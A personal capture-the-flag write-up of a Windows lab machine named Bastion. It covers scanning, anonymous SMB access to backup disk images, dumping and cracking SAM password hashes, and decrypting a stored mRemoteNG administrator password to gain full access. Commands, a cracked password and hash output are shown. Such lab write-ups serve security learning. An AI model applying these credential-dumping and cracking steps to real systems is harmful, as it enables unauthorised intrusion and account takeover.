## Nmap scan:
```
# Nmap 7.92 scan initiated Tue Jan  3 20:45:06 2023 as: nmap -sC -sV -p- -vv -Pn -oA full 10.10.10.134
Increasing send delay for 10.10.10.134 from 0 to 5 due to 517 out of 1723 dropped probes since last increase.
Increasing send delay for 10.10.10.134 from 5 to 10 due to 11 out of 11 dropped probes since last increase.
Increasing send delay for 10.10.10.134 from 10 to 20 due to 11 out of 13 dropped probes since last increase.
Increasing send delay for 10.10.10.134 from 20 to 40 due to 11 out of 13 dropped probes since last increase.
Nmap scan report for 10.10.10.134
Host is up, received user-set (0.075s latency).
Scanned at 2023-01-03 20:45:07 EST for 2639s
Not shown: 65522 closed tcp ports (reset)
PORT      STATE SERVICE      REASON          VERSION
22/tcp    open  ssh          syn-ack ttl 127 OpenSSH for_Windows_7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3bG3TRRwV6dlU1lPbviOW+3fBC7wab+KSQ0Gyhvf9Z1OxFh9v5e6GP4rt5Ss76ic1oAJPIDvQwGlKdeUEnjtEtQXB/78Ptw6IPPPPwF5dI1W4GvoGR4MV5Q6CPpJ6HLIJdvAcn3isTCZgoJT69xRK0ymPnqUqaB+/ptC4xvHmW9ptHdYjDOFLlwxg17e7Sy0CA67PW/nXu7+OKaIOx0lLn8QPEcyrYVCWAqVcUsgNNAjR4h1G7tYLVg3SGrbSmIcxlhSMexIFIVfR37LFlNIYc6Pa58lj2MSQLusIzRoQxaXO4YSp/dM1tk7CN2cKx1PTd9VVSDH+/Nq0HCXPiYh3
|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBF1Mau7cS9INLBOXVd4TXFX/02+0gYbMoFzIayeYeEOAcFQrAXa1nxhHjhfpHXWEj2u0Z/hfPBzOLBGi/ngFRUg=
|   256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB34X2ZgGpYNXYb+KLFENmf0P0iQ22Q0sjws2ATjFsiN
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds syn-ack ttl 127 Windows Server 2016 Standard 14393 microsoft-ds
5985/tcp  open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49670/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-01-04T02:28:58
|_  start_date: 2023-01-04T01:43:05
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_clock-skew: mean: -19m58s, deviation: 34m36s, median: 0s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 15404/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 26941/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 55848/udp): CLEAN (Timeout)
|   Check 4 (port 18741/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Bastion
|   NetBIOS computer name: BASTION\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-01-04T03:28:59+01:00

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jan  3 21:29:06 2023 -- 1 IP address (1 host up) scanned in 2639.24 seconds
```

139/445 - The main ports I was going to investigate, no web server so the answer is most likely there.
22 - SSH port for a windows box is unique, might be interesting later on.

I tried to log into the SMB without a password, and it worked:
```
smbclient \\\\10.10.10.134\\Backups\
```
At first I was trying to recursively download all of the files there, but it was very slow and didn't seem to work, and then I stumbled upon the ```note.txt``` file and read it:

![[images/bastion/Pasted_Image_20230104205316.png]]

So I decided to mount the SMB share on my kali File System using this command:
```
mount -t cifs //10.10.10.134/Backups /mnt/smb
```
I searched for anything interesting there, and I found two .vhd files,
.vhd (virtual hard disk) file is: a disk image file format for storing the entire contents of a computer's hard drive. 
The disk image, sometimes called a virtual machine (VM), replicates an existing hard drive, including all data and structural elements.

![[images/bastion/Pasted_Image_20230104210016.png]]

To list the files I used this command:
```
7z -l
```
And I could see that the first file contained only BOOT files, and the second one appeared to be the interesting one, so I used guestmount tool to view the files inside:
```
guestmount --add *filename* --inspector --ro -v /mnt/vhd
```

![[images/bastion/Pasted_Image_20230104210329.png]]
After a while of enumeration, I couldn't find any flags or other files that could be useful so I decided to copy the SAM and SYTEM files and dump them later on.
to do that I did this:
```
cd /Windows/Sytem32/config/
cp SYSTEM SAM .
secretsdump.py -sam SAM -system SYSTEM local
```
And this is what I got:
```
[*] Target system bootKey: 0x8b56b2cb5033d8e2e289c26f8939a25f
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
[*] Cleaning up... 
```
I used hashcat to crack L4mpje NTLM hash:
```
hashcat -m 1000 L4mpje_hash /usr/share/wordlists/rockyou.txt
``` 
Result:
```
26112010952d963c8dc4217daec986d9:bureaulampje
```

Since WinRM port (5985) Was open, I tried to connect via evil-winrm, and when it didn't work I tried using the SSH port and it worked.


# Privilege Escalation

I used winPEAS for enumeration at first, but couldn't find anything that was useful.
So I started to enumerate manually, and I found mRemoteNG directory on ```C:\Program Files (x86)```
I have never seen seen it before, so I searched and read about it, and this is what I found:

**mRemoteNG:**
mRemoteNG (mremote) is an open source project (https://github.com/rmcardle/mRemoteNG) that provides a full-featured, multi-tab remote connections manager. It  supports RDP, SSH, Telnet, VNC, ICA, HTTP/S, rlogin, and raw socket connections. Additionally, It also provides the means to save connection settings such as hostnames, IP addresses, protocol, port, **and user credentials, in a password protected and encrypted connections file.**

The password can be found at ```%appdata%/mRemoteNG``` in a file named confCons.xml. This password can sometimes be the administrator password

![[images/bastion/Pasted_Image_20230104222607.png]]

When I read the file I found this:
```                                                                                                                                           
<Node Name="DC" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="500e7d58-662a-44d4-aff0-3a4f547a3fee" Userna                                                             
me="Administrator" Domain="" Password="aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw=="                                                             
```
It looks like the Administrator password, to decrypt it I used a tool called [mRemoteNG-Decrypt](https://github.com/haseebT/mRemoteNG-Decrypt)
![[images/bastion/Pasted_Image_20230104223021.png]]

I connected via SSH, and it worked:

![[images/bastion/Pasted_Image_20230104223144.png]]

